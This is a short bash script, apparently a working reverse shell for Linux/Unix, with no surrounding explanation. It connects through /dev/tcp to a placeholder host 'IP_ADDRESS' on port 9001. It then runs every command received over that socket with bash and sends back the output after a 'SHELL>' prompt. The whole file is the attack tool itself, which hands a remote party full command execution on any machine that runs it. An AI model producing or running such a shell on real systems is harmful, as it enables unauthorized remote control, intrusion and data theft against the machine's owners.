#Linux / Unix
#!/bin/bash

host="IP_ADDRESS"
port=9001

exec 3<>/dev/tcp/$host/$port 2>/dev/null
if [ $? -ne 0 ]; then
    echo "Connection refused to $host:$port"
    exit 1
fi

send_prompt() {
    echo -n "SHELL> " >&3
}

send_prompt

while true; do
    if ! IFS= read -r -t 0.1 -u 3 cmd; then
        # No data received, check if socket is closed
        if ! kill -0 $$ 2>/dev/null; then
            break
        fi
        sleep 0.1
        continue
    fi

    # Remove trailing newline (read strips newline by default)
    command="$cmd"

    # Exit condition
    if [[ "${command,,}" == "exit" ]]; then
        break
    fi

    # Execute command with timeout 30 seconds
    output=$(timeout 30 bash -c "$command" 2>&1)
    status=$?

    if [ $status -eq 124 ]; then
        output="Command timed out after 30 seconds"
    elif [ $status -ne 0 ]; then
        output="$output"
    fi

    # Send output and prompt
    echo -n "$output"$'\n'"SHELL> " >&3
done

exec 3>&-
exec 3<&-